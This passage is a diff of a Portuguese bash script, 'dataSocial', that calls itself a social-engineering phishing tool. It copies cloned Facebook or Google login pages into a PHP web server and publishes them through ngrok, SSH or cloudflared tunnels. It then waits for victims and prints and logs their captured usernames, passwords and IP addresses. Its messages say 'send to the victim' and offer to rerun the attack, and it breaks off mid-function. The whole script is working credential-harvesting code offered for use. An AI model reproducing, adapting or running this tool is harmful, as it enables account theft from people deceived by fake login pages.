@@ -1,8 +1,8 @@
-#/!/usr/bin/env bash
+#!/usr/bin/env bash
 # dataSocial - Pesca dados de redes sociais através de páginas sociais modificadas usando a técnica phishing de engenharia social
 #
-# Site		: https://programadorboard.epizy.com/autor
-# Autor		: Oliver Silva <programadorboard@gmail.com>
+# Site			: https://programadorboard.epizy.com/autor
+# Autor			: Oliver Silva <programadorboard@gmail.com>
 # Manutênção 	: Oliver Silva <programadorboard@gmail.com>
 #
 # -------------------------------
@@ -10,21 +10,30 @@
 #
 # Exemplo:
 #
-# $ ./dataSocial --service facebook --tunnel ssh --listen
+# $ ./datasocial.sh --listen facebook
+# 
+# ~/DataSocial $ termux-chroot ./datasocial.sh --listen google
 #
-# [+] Dados para enviar a vítima:
-# [+] Localhost: localhost:5555
-# [+] Ngrok localhost: http://localhost:5555
-# [+] Ngrok URL: https://00c8-191-96-225-179.sa.ngrok.io
-# [-] Nova conexão aberta: 127.0.0.1
-# [-] Credenciais capturadas:
-# [+] Seu log está em logs/dataSocial.txt
-# [-] Usuário: example@server.com
-# [-] Senha: teste
-# [?] Digite 'ctr+C' OU 'quit' para cancelar OU 'rerun' para realizar novamente este ataque
-# quit
+#                '
+#              '   '  TIOOLIVER | https://t.me/tiooliver_sh
+#            '       '   https://youtube.com/@tioolive - BRAZIL
+#        . ' .    '    '                       '
+#     '              '                      '   '
+#  █▀▄ ▄▀█ ▀█▀ ▄▀█   █▀ █▀█ █▀▀ █ ▄▀█ █░░
+#  █▄▀ █▀█ ░█░ █▀█   ▄█ █▄█ █▄▄ █ █▀█ █▄▄
+#  .                          ..'.    ' .
+#    '  .                   .     '       '
+#          ' .  .  .  .  . '.    .'         '  '
+#             '         '    '. '              .
+#               '       '      '
+#                 ' .  '   Site: https://toolmuxapp.pythonanywhere.com
 #
-# [×] Programa interrompido
+# [!] Público: http://localhost:1492
+# [+] Nova conexão aberta: 127.0.0.1
+# [+] Credenciais capturadas:
+#    [Usuário]   ana@example.com
+#    [Senha]     jsjjssjsjwjs
+# [!] Seu log está in: logs/datasocial.txt
 #
 # Histórico:
 #
@@ -48,6 +57,8 @@
 #     Adicionado um proxy reverso localxspose
 # v1.0 2023-9-16, Oliver Silva:
 #     Adicionada opção de adicionar token de acesso de tunels
+# v1.1 2024-5-8, Oliver Silva:
+#	 Adicionado cloudflared e refatoração de código
 #
 # Licença: MIT License
 #
@@ -61,843 +72,564 @@
 # Versão 0.8: Página do gooogle atualizada, refatoração.
 # Versão 0.9: Novo tunnel adicionado, refatoração.
 # Versão 1.0: Nova opção '--add-token' adicionada para vincular contas através do token de acesso.
+# Versão 1.1: Novas opçôes '--auth-key',  '--generate-ssh-key' e '--silent' para ativar o modo silêncioso, e refatoração do código
 #
 
+# Carrega variáveis e funções da configuração
+source config/st.sh
+source config/banner.sh
+source config/help.sh
+source config/version.sh
 
-### trap
-
-trap interruptTwo SIGINT SIGTSTP
-
-
-### VARIÁVEIS ###
-
-### Localhost e port
-
+# Configurações de rede e diretórios
 host="localhost"
-port="5555"
+port="1492" #"$(shuf -i 1000-9999 -n 1)"
+www="www"
+websites="websites"
 
-args=$@
+HISTFILE=~/.datasocial_history
+HISTSIZE=1000
+HISTSIZEFILE=1000
 
-### Chaves de ativação de funcionalidade
+# Cria o arquivo personalizado do histórico de comandos
+>"$HISTFILE"
 
-tokenAccessKey=0
-serviceKey=0
-listenKey=0
-tunnelKey=0
+# Carrega o histórico do arquivo
+history -r "$HISTFILE"
 
+# Chaves de controle para argumentos e exibição
+serviceSelectedKey=0
+tunnelSelectedKey=0
+silentKey=0
 
-### FUNÇÔES ###
+# Paleta de cores
+red="\e[31;1m"
+green="\e[32;1m"
+yellow="\e[33;1m"
+blue="\e[34;1m"
+magenta="\e[35;1m"
+cyan="\e[36;1m"
+reset="\e[0m"
+under="\e[4m"
 
+trap cleanExit INT
 
-### Checa termux-chroot
-
-checkProot() {
-    if [ ! -d /etc/apt ] ; then
-	echo -e "\n\e[0mRun the program in proot or another type.\nExample : 'termux-chroot ./datasocial.sh $args'\e[0m."
-	interruptTwo
-    fi
+# Encerra a execução do script de forma limpa.
+# Finaliza processos em segundo plano, exibe mensagem de encerramento
+# (se não estiver em modo silencioso) e sai com código 0.
+cleanExit() {
+	echo -e "\n\n${red}Encerrando o programa...${reset}\n"
+	removeFiles
+	killAllProcess
+	tput cnorm
+	exit 0
 }
 
-
-### Checa serviço
-
-checkService() {
-    serviceSelected=$1
-
-    if [ -d ./websites/$serviceSelected ] ; then
-        echo -e "\n\e[0m\e[31;1mService => $serviceSelected\e[0m"
-    else
-        echo -e "\n\e[0m\e[33;1mInvalid service => $serviceSelected\e[0m"
-	unset serviceSelected
-    fi
-}
-
-
-### Checa tunnel
-
-checkTunnel() {
-    tunnelSelected=$1
-    serviceSelected=$2
-
-    # Checa se o serviço foi selecionado antes do 'tunnel'
-    if [ -n "$serviceSelected" ] ; then
-
-        if [ -f ./tunnels/$tunnelSelected ] ; then
-      	    echo -e "\n\e[0m\e[31;1mTunnel => $tunnelSelected\e[0m"
-        else
-	    echo -e "\n\e[0m\e[33;1mInvalid tunnel => $tunnelSelected\e[0m"
-	    unset tunnelSelected
-        fi
-    else
-	echo -e "\n\e[0m\e[33;1m[!] Select a service before defining the tunnel\e[0m"
-	unset tunnelSelected
-    fi
-}
-
-
-### Interrompe processos e apaga arquivos
-
-interrupt() {
-    echo -e "\n\e[32m[\e[33;1m×\e[32m] \e[31;1mInterrupted program\e[0m"
-    killProcess
-    removeFiles
-    stty -echoctl
-}
-
-### Interrompe processo, apaga arquivos e sai do programa
-
-interruptTwo() {
-    interrupt
-    exit 1
-}
-
-
-### Apaga arquivos
-
+# Remove o diretório 'www' se ele existir (limpeza antes de iniciar novo serviço)
 removeFiles() {
-    [ -d ./www ] && rm ./www -rf
+	[ -d "$www" ] && rm "$www" -rf
 }
 
+# Verifica se o diretório /etc/apt existe, indicando que o ambiente está configurado corretamente.
+# Retorna 0 se o diretório existir, indicando que o ambiente é válido, e 1 caso contrário.
+checkEnvironmentProot() {
+	if [ ! -d /etc/apt ]; then
+		return 1
+	else
+		return 0
+	fi
+}
 
-### Copia arquivos
-
+# Copia os arquivos do site selecionado para o diretório 'www'
+# Parâmetros:
+#   $1 - Nome do serviço (pasta dentro de 'websites')
 copyFiles() {
-    service=$serviceSelected
+	local serviceSelected="$1"
 
-    [ ! -d ./www ] && mkdir ./www
-
-    if [ -d websites/${service} ] ; then
-		cp -rf websites/${service}/* ./www
-    else
-		echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mThis service is not available\e[0m"
-    fi
-}
-
-
-### Mata todos os processos
-
-killProcess() {
-    [ $(ps -e | grep -Eo "php") ] && pkill php
-    [ $(ps -e | grep -Eo "ngrok") ] && pkill ngrok
-    [ $(ps -e | grep -Eo "ssh") ] && pkill ssh
-    [ $(ps -e | grep -Eo "loclx") ] && pkill loclx
-}
-
-
-### Extrai arquivos
-
-extract() {
-    tunnelName="$1"
-    arch="$2"
-
-    if [ "$tunnelName" == "ngrok" ] ; then
-	tar -xvzf ngrok-v3-stable-linux-${arch}.tgz -C tunnels/ > /dev/null
-
-    elif [ "$tunnelName" == "loclx" ] ; then
-	unzip loclx-linux-${arch}.zip -d tunnels/ > /dev/null
-
-    fi
-}
-
-
-### Instala uma ferramenta de tunnel se não existir
-
-installTunnel() {
-    case "$(dpkg --print-architecture)" in
-	aarch64) arch="arm64";;
-	armhf | arm) arch="arm";;
-	amd64) arch="amd64";;
-	x86_84) arch="amd64";;
-	i*86) arch="i386";;
-	i386) arch="i386";;
-    *)
-	echo "[!] Invalid architecture"
-	exit 1
-    esac
-
-
-    tunnelName="$1"
-    tunnelIndex="$2"
-
-    tunnelsLinks=(
-	"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${arch}.tgz"
-	"https://api.localxpose.io/api/v2/downloads/loclx-linux-${arch}.zip"
-    )
-
-    if [ ! -f ./tunnels/$tunnelName ] ; then
-	printf "\r\e[33;1m[*] Installing $tunnelName...\e[0m"
-	curl -LO ${tunnelsLinks[$tunnelIndex]} > /dev/null 2>&1 &
+	removeFiles
 	
-	while [ -n "$(ps -e | grep -Eo 'curl')" ] ; do
-	    printf "\r\e[33;1m[*] Installing $tunnelName..."
-	    
-    	done
-	printf "\r\e[33;1m[+] Installing $tunnelName...\e[32;1mOK\e[0m\n"
+	[ ! -d "$www" ] && mkdir "$www"
+	[ ! -d "logs" ] && mkdir -p logs
+	[ ! -d "pids" ] && mkdir -p pids
+
+	# Verificação extra
+	if ! checkST "services" "$serviceSelected"; then
+		echo -e "${red}Serviço $serviceSelected inválido.${reset}"
+		exit 1
+	fi
 	
-	while [ ! -f ./tunnels/$tunnelName ] ; do
-	    printf "\r\e[33;1m[*] Extracting $tunnelName...\e[0m"
-	    extract $tunnelName $arch
+	cp $websites/$serviceSelected/* $www -rf
+}
+
+# Finaliza todos os processos relacionados aos túneis e servidor local (php, ngrok, ssh e cloudflared).
+killAllProcess() {
+	local pid_files=("php.pid" "ngrok.pid" "ssh.pid" "cloudflared.pid")
+
+	for file in "${pid_files[@]}"; do
+		local path="pids/$file"
+
+		if [ -f "$path" ]; then
+			pid=$(cat "$path")
+
+			if kill -0 "$pid" 2>/dev/null; then
+				kill "$pid" 2>/dev/null
+				sleep 1
+				kill -9 "$pid" 2>/dev/null
+			fi
+			rm -f "$path"
+		fi
 	done
-	printf "\r\e[33;1m[+] Extracting $tunnelName...\e[32;1mOK\e[0m\n"
-	rm *.zip *.tgz > /dev/null 2>&1
-    fi
+}
 
+# Verifica se a autenticação necessária está configurada para o túnel selecionado (ngrok ou SSH).
+checkAuthAccount() {
+	local tunnel="$1"
+
+	if [ $silentKey -eq 0 ]; then
+		case "$tunnel" in
+			ngrok)
+				# Verifica Ngrok
+				if ! cat $HOME/.config/ngrok/ngrok.yml > /dev/null 2>&1; then
+					echo -e "${red}[!] Configure o ngrok com a chave da sua conta antes de usá-lo.${reset}"
+					exit 1
+				fi
+				;;
+
+			ssh)
+				# Verifica SSH
+				if [ ! -f $HOME/.ssh/id_rsa ] || [ ! -f $HOME/.ssh/id_rsa.pub ] ; then
+					echo -e "${red}[!] Gere uma chave SSH com 'ssh-keygen' antes de usar o tunnel SSH (localhost.run).${reset}"
+					exit 1
+				fi
+				;;
+			*)
+				echo -e "${red}Túnel inválido.${reset}"
+				exit 1;;
+		esac
+	fi
+}
+
+# Gera uma nova chave SSH RSA de 4096 bits com o e-mail fornecido como comentário.
+generateSshKey() {
+	local email="$1"
+
+	ssh-keygen -t rsa -b 4096 -C $email
+
+	exit 0
 }
 
 
-### Ativa servidor localmente
+# Adiciona o token de autenticação à configuração do Ngrok
+addNgrokToken() {
+	local token="$1"
 
-listenServer() {
-    php -S ${host}:${port} -t ./www &> wait.log &
-    sleep 3
-    
+	ngrok config add-authtoken "$token"
 }
 
+# Verifica se uma chave existe em um array associativo passado por nome. Retorna 0 se existir, 1 caso contrário.
+checkST() {
+	local arrayName="$1"
+	local key="$2"
 
-### Grupo de funçôes
+	declare -n assoc="$arrayName"
 
-groupFunction() {
-    removeFiles
-    copyFiles
-    killProcess
-}
-
-
-### Aguarde
-
-waitMessage() {
-    list="$1"
-
-    echo -e "\n"
-    for i in $(seq $list) ; do
-        printf "\r[*] Wait, please...$i/$list"
-	sleep 1
-    done
-    echo -e "\n\n"
-}
-
-
-### Adiciona token de acesso 
-
-addTokenAccess() {
-    tokenName="$tokenAccess"
-
-    if [ ! -f ./tunnels/$tokenName ] ; then
-	echo -e "\e[0m[\033[31;1m!\e[0m] Tunnel does not exist $tokenName to add the access token"
-	exit
-
-    elif [ "$tokenName" == "ngrok" ] ; then
-	echo -e "\e[0m1 register at : \e[32;1mhttps://dashboard.ngrok.com/signup\e[0m"
-	echo -e "\e[0m2 Access your account at : \e[32;1mhttps://dashboard.ngrok.com/login\e[0m"
-	echo -e "\e[0m3 Copy the access token : \e[32;1mhttps://dashboard.ngrok.com/get-started/your-authtoken\e[0m"
-	echo -e "\nToken Access" ; read token
-	
-	[ -z "$token" ] && addTokenAccess
-	[ -n "$token" ] && ./tunnels/ngrok config add-authtoken $token
-	exit
-
-    elif [ "$tokenName" == "loclx" ] ; then
-	echo -e "\e[0m1 register at : \e[32;1mhttps://localxpose.io/signup\e[0m"
-	echo -e "\e[0m2 Access your account at : \e[32;1mhttps://localxpose.io/login\e[0m"
-	echo -e "\e[0m3 Copy the access token : \e[32;1mhttps://localxpose.io/dashboard/access\e[0m"
-
-	./tunnels/loclx account login
-    fi
-}
-
-
-### tunnels
-
-listen() {
-    case "$tunnelSelected" in
-	"ngrok")
-	    groupFunction
-	    installTunnel "ngrok" "0"
-	    listenServer
-	    ./tunnels/ngrok http $port --log=stdout &> wait.log &
-            waitMessage 3
-	    showLink "ngrok"
-	    
-	    ;;
-
-        "ssh")
-	    groupFunction
-	    listenServer
-	    ./tunnels/ssh -tt -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R $service:$port:$host:$port serveo.net &> wait.log &
-	    waitMessage 2
-	    showLink "ssh"
-	    ;;
-
-	"loclx")
-	    groupFunction
-	    installTunnel "loclx" "1"
-	    listenServer
-	    ./tunnels/loclx tunnel --raw-mode http --https-redirect --to ${host}:${port} &> wait.log &
-	    waitMessage 10
-	    showLink "loclx"
-	    ;;
-
-	*)
-	    if [ -z "$tunnelSelected" ] ; then
-		groupFunction
-		listenServer
-		waitMessage 3
-		showLink "localhost"
-	    fi
-	    
-	    echo -e "\e[0m[\e[33;1m!\e[0m] Running without tunnel\e[0m"
-	    ;;
-    esac
-}
-
-
-#### Mostra link
-
-showLink() {
-    checkReq && banner
-    tunnel="$1"
-    
-    echo -e "\e[0m[!] Send to the victim:\e[0m"
-
-    if [ "$tunnel" == "localhost" ] ; then
-	link="$(grep -o 'http://[-0-9a-z:]*' wait.log)"
-
-	if [ -n "$link" ] ; then
-	
-	    echo -e "\e[0m[+] Localhost: \e[33;1m$link\e[0m"
+	if [[ -n "${assoc[$key]}" ]]; then
+		return  0
 	else
-	    echo -e "\e[31;1m$(grep -o "Error:.*" wait.log)\e[0m"
-	    
+		return 1
+	fi
+}
+
+# Inicia o servidor local com PHP e exibe o link gerado se não estiver em modo silencioso.
+listenServerLocalhost() {
+	showBanner
+
+	local link=
+	local serviceSelected="$1"
+
+	if ! checkEnvironmentProot; then
+		echo -e "${red}[!]${reset} Ambiente Proot não detectado. Certifique-se de que o Proot está instalado e configurado corretamente."
+		exit 1
 	fi
 
-    elif [ "$tunnel" == "ngrok" ] ; then
-	link="$(grep -o 'https://[-0-9a-z.]*' wait.log)"
-
-	if [ -n "$link" ] ; then
-	
-	    echo -e "\e[0m[+] Ngrok: \e[33;1m$link\e[0m"
-	else
-	    echo -e "\e[31;1m$(grep -o "Error:.*" wait.log)\e[0m"
-	    
+	if ! checkST "services" "$serviceSelected"; then
+		echo -e "${red}Serviço ${yellow}$serviceSelected ${red}inválido.${reset}"
+		exit 1
 	fi
 
-    elif [ "$tunnel" == "ssh" ] ; then
-	echo -e "\e[0m[!] SSH: \e[33;1mserveo.net:$port\e[0m"
+	copyFiles "$serviceSelected"
 
-    elif [ "$tunnel" == "loclx" ] ; then
-	link="$(grep -o '[-0-9a-z.]*loclx.io' wait.log)"
+	killAllProcess
 
-	if [ -n "$link" ] ; then
-	
-	    echo -e "\e[0m[+] Localxpose: \e[33;1m$link\e[0m"
-	else
-	    echo -e "\e[31;1m$(grep -o "Error:.*" wait.log)\e[0m" 
-	    
-	fi      
-	
-    fi
+	php -S "$host:$port" -t "$www" > logs/php.log 2>&1 & echo $! > pids/php.pid
+	link=$(waitTunnelLink "logs/php.log" "http://[-1-9a-z:]*")
+	showTunnelLink "localhost" "$link"
 }
 
+# Aguarda o link ser gerado no log especificado
+# Parâmetros:
+#   $1 - Caminho do arquivo de log
+#   $2 - Expressão regex para extrair o link
+# Retorno:
+#   Echo com o link (se encontrado)
+waitTunnelLink() {
+	local log_file="$1"
+	local regex="$2"
+	local link=""
 
+	for i in {1..15}; do
+		link=$(grep -oP "$regex" "$log_file")
 
-### Mostra o ip
-
-get_ip() {
-    while [ ! -f ./www/ip.txt ] ; do
-	printf "\r\e[0m[*] Listening connection...\e[0m"
-    done
-
-    ip=$(cat ./www/ip.txt | grep -Eo ":.*" | tr -d \ :)
-    printf "\r\e[0m[+] New open connection: \e[33;1m$ip\e[0m\n"
-
-}
-
-
-### Mostra os dados de acesso
-
-get_data() {
-    while [ ! -f ./www/src/dados.txt ] ; do 
-	printf "\r\e[0m[*] Waiting for credentials...\e[0m"
-    done
-
-    [ ! -d ./logs ] && mkdir logs
-
-    cat ./www/src/dados.txt > ./logs/dataSocial.txt
-    printf "\r\e[0m[+] Captured credentials:     \e[0m\n"
-    printf "\r\e[0m[+] Your log is in \e[32mlogs/dataSocial.txt\e[0m\n"
-
-    usuario=$(cat ./www/src/dados.txt | grep -Eo "Usuário:.*" | grep -Eo ":.*" | tr -d \ :)
-    senha=$(cat ./www/src/dados.txt | grep -Eo "Senha:.*" | grep -Eo ":.*" | tr -d \ :)
-
-    echo -e "\e[0m[+] Username: \e[32m$usuario\e[0m"
-    echo -e "\e[0m[+] Password: \e[32m$senha\e[0m"
-}
-
-
-
-### Repetir o teste
-
-control() {
-    echo -e "\e[0mType 'ctr+C' OR 'quit' to cancel OR 'rerun' to rerun this attack\e[0m" ; read
-	
-    if [ "$REPLY" == "rerun" ] ; then
-	rerun
-
-    elif [ "$REPLY" == "quit" ] ; then
-        interruptTwo
-
-    else
-	control
-    fi
-}
-
-
-
-### Mostra o ip, dados de acesso e pergunta se repete o teste
-
-getDataCaptured() {
-    get_ip
-    get_data
-    control
-}
-
-
-### Banner
-
-banner() {
-	local w="\e[0m"    # Color white
-	local b="\e[34;1m" # Color blue
-	local f="\e[34;3m" # Color blue font italic
-
-	echo -e "${b}
-	        '  
-              '   '  TIOOLIVER | ${f}t.me/tiooliver_sh
-            '       '   ${f}youtube.com/@tioolive ${w}${b}- BRAZIL
-        . ' .    '    '                       '
-     ' 		    '	                   '   '
-  █▀▄ ▄▀█ ▀█▀ ▄▀█   █▀ █▀█ █▀▀ █ ▄▀█ █░░
-  █▄▀ █▀█ ░█░ █▀█   ▄█ █▄█ █▄▄ █ █▀█ █▄▄ 
-  .			     ..'.    ' .
-    '  .    		   .     '       '
-          ' .  .  .  .  . '.    .'         '  '
-	     '         '    '. '              .
-	       '       '      '
-	         ' .  '   Site: ${f}http://tiooliver.rf.gd 
-${w}"
-}
-
-
-### Ajuda
-
-helper() {
-    space="  "
-    echo -e "Uso: $(basename "$0") [OPÇÔES]\n$space-h, --help\t\tShow  this help screen and exit\n$space-v, --version\t\tShows the current version of the program\n$space--add-token TOKEN\tAdd access token\n$space-S, --services\tShow all services\n$space-T, --tunnels\t\tShow all tunnels\n$space-s, --service\t\tUse a service\n$space-l, --listenServer\tEnable listenning on localhost\n$space-t, --tunnel\t\tDefines a tunnel\n$space-i, \n$space--interactive\t\tStart the program in interactive mode\n\nExamples:\n\nLocalhost:\n$space${0} -s facebook -l\n\nTunnel:\n$space${0} -s facebook -l -t ngrok"
-    exit 0
-}
-
-### Versão
-
-version() {
-    echo -ne "$(basename "$0")"
-    grep "^# Versão" "$0" | tail -1 | cut -d ":" -f 1 | tr -d \# | tr A-Z a-z
-}
-
-
-### Percorre a uma lista
-
-
-list() {
-    array="$1"
-    count=1
-
-    echo -e "\n\e[0mAll $2\e[0m"
-
-    for index in $array/* ; do
-	index=$(basename "$index")
-	echo -e "\e[0m$count => \e[0m\e[32;2m$index\e[0m"
-	count=$((count +1))
-    done
-}
-
-
-### Checa pacotes necessários
-
-
-checkReq() {
-    listReq=("ssh" "tar" "php" "jq" "curl" "toilet" "figlet" "unzip" "proot")
-
-    for package in ${listReq[*]} ; do
-		if [ "$package" == "openssh" ] ; then
-	   		package="ssh"
-
+		if [[ -n "$link" ]]; then
+			echo "$link"
+			return 0
 		fi
+		sleep 1
+	done
 
-		if [ -z "$(dpkg -l | grep $package)" ] ; then
-	    	echo -e "\e[0mPackage required not found => \e[0m\e[33;2m$package\e[0m"
-	    	echo -e "\e[0mTry run => \e[0m\e[32;2mbash ./setup.sh --install\e[0m"
-	    	exit 1
-		fi
-    done
-}
+	echo ""
+	return 1
+}	
 
+# Exibe o link público do túnel ou localhost, ou uma mensagem de erro personalizada caso o link esteja vazio.
+# Parâmetros:
+#   $1 - Localhost ou Nome do túnel (ngrok, ssh, cloudflared)
+#   $2 - Link gerado pelo túnel
+showTunnelLink() {	
+	local tsSelected="$1"
+	local link="$2"
 
-### Repetir o teste
-
-
-rerun() {
-    echo -e "\e[0mRun that attack again? [y/n] : \e[0m" ; read
-
-    if [ -z "$REPLY" ] ; then
-	rerun
-
-    elif [ -n "$REPLY" -a "$REPLY" == "y" -o "$REPLY" == "Y" ] ; then
-	interrupt > /dev/null && ./datasocial.sh $args
-
-    elif [ -n "$REPLY" -a "$REPLY" == "n" -o "$REPLY" == "N" ] ; then
-	interrupt
-
-    else
-	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mInvalid answer, try '\e[33;1my\e[31;1m' or '\e[33;1mn\e[31;1m'\e[0m\n"
-	rerun
-    fi
-}
-
-
-### Uso do Modo interativo
-
-
-usage_i() {
-    echo -e "\n\n\t\e[0mCommand\t\tDescription\n\t-------\t\t-----------\n\t?\t\tHelp menu\n\tquit\t\tStop this program\n\tshow <?>\tIt shows services, tunnels, default options. Replace <?> with one of these 3 commands\n\tuse <?>\t\tUse services and etc. Replace <?> with one of these commands\n\tset <?>\t\tDefine tunnels and etc. Replace <?> with one of these commands\n\trun\t\trun the setup\n\n"
-}
-
-
-### Opçôes do modo interativo
-
-
-options_i() {
-    echo -e "\n\e[0mModule options (service/${1:-No service}):\n\n\tName\tCurrent Setting\tRequire\tDescription\n\t----\t---------------\t-------\t-----------\n\tTunnel\t[${2:-No tunnel}]\t\tno\tAllow the tunnel\n\n"
-}
-
-
-### Menu modo interativo
-
-
-menu() {
-
-    count=0
-    commands=()
-
-    scape=$(printf '\u1b')
-    cmd="\e[0m\e[31;1mDs\e[36;3m>\e[0m\e[34m"
-
-    while [[ true ]] ; do
-
-	echo -ne "\r$cmd $comm"
-
-	IFS= read -rsn1 mode
-
-	if [[ $mode == $scape ]] ; then
-	    IFS= read -rsn2 mode
-
-	    case $mode in
-		"[A")
-		    if [[ ${#commands[*]} -ge 1 ]] ; then
-	
-			index=$[ $count -1 ]
-			comm=${commands[$index]}
-		    fi
-		    ;;
-		"[B")
-			unset comm
-			printf "\r                                                 "
-		    ;;
-		*)
-            esac
-
-	elif [[ $mode == $'\x7f' ]] ; then
-	    if [[ -n $comm ]] ; then
-
-		comm=${comm%?}
-		printf "\b \b"
-		
-	    fi
-     
-        elif [[ $mode == $'\0A' ]] ; then
-	    if [[ -n "$comm" ]] ; then
-
-		# quit, exit
-		if [[ "$comm" == "quit" ]] || 
-		   [[ "$comm" == "QUIT" ]] || 
-		   [[ "$comm" == "exit" ]] || 
-		   [[ "$comm" == "EXIT" ]] ; then
-		
-		    interrupt && exit 0
-
-		# help, ?
-		elif [[ "$comm" == "help" ]] || 
-		     [[ "$comm" == "HELP" ]] || 
-		     [[ "$comm" == "?" ]] ; then
-	      	    commands[$count]=$comm
-		    usage_i
-
-		# show
-		elif [[ "${comm:0:4}" == "show" ]] ; then
-		    commands[$count]=$comm
-		    if [[ -n "${comm:5}" ]] ; then
-
-			if [[ "${comm:5:8}" == "services" ]] ; then
-      	    	            list ./websites/ "services"
-			    commands[$count]=$comm
-
-			elif [[ "${comm:5:7}" == "tunnels" ]] ; then
-			    list ./tunnels "tunnels"
-			    commands[$count]=$comm
-
-			elif [[ "${comm:5:7}" == "options" ]] ; then
-			    commands[$count]=$comm
-
-			    options_i "$serviceSelected" "$tunnelSelected"
-
-			else
-
-			    echo -e "\n\e[0m\e[33;1mCommands = services - tunnels - options ?\e[0m"
-
-			fi
-
-		    else
-			echo -e "\n\e[0m\e[33;1mCommands = services - tunnels - options ?\e[0m"
-
-		    fi
-
-		# use
-		elif [[ "${comm:0:3}" == "use" ]] ; then
-
-		    commands[$count]=$comm
-
-		    if [[ -n "${comm:4}" ]] ; then
-
-		        if [[ "${comm:4:7}" == "service" ]] ; then
-			    commands[$count]=$comm
-
-			    if [[ -n "${comm:12}" ]] ; then
-				
-				commands[$count]=$comm
-			        checkService "${comm:12}"
-				
-		            else
-				echo -e "\n\e[0m\e[33;1mCommands = show services - ?\e[0m"
-
-			    fi
-
-			else
-			    echo -e "\n\e[0m\e[33;1mCommands = service - ?\e[0m"
-
-		        fi
-
-		    else
-			echo -e "\n\e[0m\e[33;1mCommands = service - ?\e[0m"
-
-		    fi
-
-		# set
-		elif [[ "${comm:0:3}" == "set" ]] ; then
-
-		    commands[$count]=$comm
-
-		    if [[ "${comm:4:6}" == "tunnel" ]] ; then
+	if [ $silentKey -eq 0 ]; then
+		if [ -z "$link" ]; then
+			case "$tsSelected" in
+				"localhost")
+					echo -e "${red}[x]${reset} Nenhum link localhost foi gerado. Verifique se o servidor foi iniciado corretamente.";;
+				ngrok)
+					echo -e "${red}[x]${reset} Link do ngrok vazio. Verifique se a chave está configurada e o serviço está disponível.";;
+				ssh)
+					echo -e "${red}[x]${reset} Link SSH ausente. Verifique a conexão com localhost.run.${reset}";;
+				cloudflared)
+					echo -e "${red}[x]${reset} Cloudflared não conseguiu gerar um endereço público.";;					
+				*)
+					echo -e "${red}[x]${reset}Túnel desconhecido ou o link não encontrado.";;
+			esac
 			
-			if [[ -n "${comm:11}" ]] ; then
-
-			    commands[$count]=$comm
-			    checkTunnel "${comm:11}" "$serviceSelected"
-
-			else
-			    echo -e "\n\e[0m\e[33;1mCommands = ngrok - ssh - show tunnels - ?\e[0m"
-			
-			fi
-
-		    else
-			echo -e "\n\e[0m\e[33;1mCommands = tunnel - help\e[0m"
-
-		    fi
-
-		# run, execute, exploit
-		elif [[ "${comm:0:3}" == "run" ]] || 
-		     [[ "${comm:0:7}" == "execute" ]] || 
-		     [[ "${comm:0:7}" == "exploit" ]] ; then
-		    commands[$count]=$comm
-
-		    if [[ -n "$serviceSelected" ]] && 
-		       [[ -z "$tunnelSelected" ]] then
-			echo -e "\n\e[0mRunning the setup locally\e[0m..."
-			args="--listenServer --service $serviceSelected"
-			listen && getDataCaptured
-
-		    elif [[ -n "$serviceSelected" ]] && 
-			[[ -n "$tunnelSelected" ]] ; then
-			echo -e "\n\e[0mRunning the configuration with tunnel\e[0m..."
-			args="--listenServer --service $serviceSelected --tunnel $tunnelSelected"
-			listen && getDataCaptured
-
-		    else
-			echo -e "\n\e[0m\e[33;1m[!] No settings defined\e[0m"
-
-		    fi
-
 		else
-		    echo -e "\n\e[0m\e[33;1mCommands = ? - help\e[0m"
+			if [ "$tsSelected" == "localhost" ]; then
+				echo -e "${green}[+]${reset} Local: ${yellow}$link${reset}"
+			else
+				echo -e "${green}[+]${reset} Público: ${yellow}$link${reset}"
+			fi
+		fi
+	fi
+}
+
+# Inicia o servidor local e o expõe publicamente por meio do túnel selecionado (ngrok, ssh, cloudflared ou Localxpose).
+# Valida o túnel, executa o comando correspondente, extrai o link público gerado e o exibe.
+# Parâmetros:
+#   $1 - Nome do túnel a ser utilizado
+listenServerPublic() {
+	local link=
+	local tunnelSelected="$1"
+
+	if ! checkST "tunnels" "$tunnelSelected"; then
+		echo -e "${red}Túnel $tunnelSelected inválido.${reset}"
+		exit 1
+	fi
+
+	case "$tunnelSelected" in
+		ngrok)
+			checkAuthAccount "ngrok"
+			bin/ngrok http $port --log=stdout > logs/ngrok.log 2>&1 & echo $! > pids/ngrok.pid
+			link=$(waitTunnelLink "logs/ngrok.log" "url=\Khttps://[^\s]+")
+			;;
+		ssh)
+			checkAuthAccount "ssh"
+		
+			ssh -i $HOME/.ssh/id_rsa -R 80:localhost:$port ssh.localhost.run > logs/ssh.log 2>&1 & echo $! > pids/ssh.pid
+			
+			link=$(waitTunnelLink "logs/ssh.log" "https://[a-z0-9]+\.lhr\.life" | head -n 1)
+			;;
+			
+		cloudflared)
+			cloudflared tunnel --url http://$host:$port > logs/cloudflared.log 2>&1 & echo $! > pids/cloudflared.pid
+
+			link=$(waitTunnelLink "logs/cloudflared.log" "https://\S*trycloudflare.com")
+			;;
+			
+		*)
+			echo -e "${red}Túnel não existe.${reset}"
+			exit 1
+			;;
+	esac
+
+	showTunnelLink "$tunnelSelected" "$link"
+}	
+
+# Aguarda a criação do arquivo de IP e exibe o IP da nova conexão quando detectado.
+getIp() {
+	local ip_file="$www/ip.txt"
+	local spinner='|/-\'
+	local i=0
+
+	tput civis
+	
+	while [ ! -f "$ip_file" ]; do
+		if [ $silentKey -eq 0 ]; then
+			printf "\r\e[K${blue}[*]${reset} Escultando conexão... %c" "${spinner:i++%${#spinner}:1}"
 		fi
 
-		unset comm
-		count=$[ $count +1 ]
+		sleep 0.5
+	done
 
-	    else
-		echo -e "\n\e[0m\e[33;1mError, try? or help for more help!\e[0m"
-	
-	    fi
+	ip=$(awk ' {print $3} ' "$ip_file")
 
-        else
-	    comm+=$mode 
+	if [ $silentKey -eq 0 ]; then
+		printf "\r\e[K${green}[+]${reset} Nova conexão aberta: ${cyan}$ip${reset}\n"
 	fi
-    done
-    interrupt
-    exit 0
 }
 
+# Aguarda o recebimento de dados de login, exibe as credenciais capturadas e as salva em um arquivo de log.
+getData() {
+	getIp
 
-### Total de serviços
+	local data_file="$www/src/dados.txt"
+	local log_file="logs/datasocial.txt"
+	local spinner='|/-\'
+	local i=0
 
-total_services() {
-    count=0
-    for index in ./websites/*; do
-	count=$((count +1)); 
-    done
-    
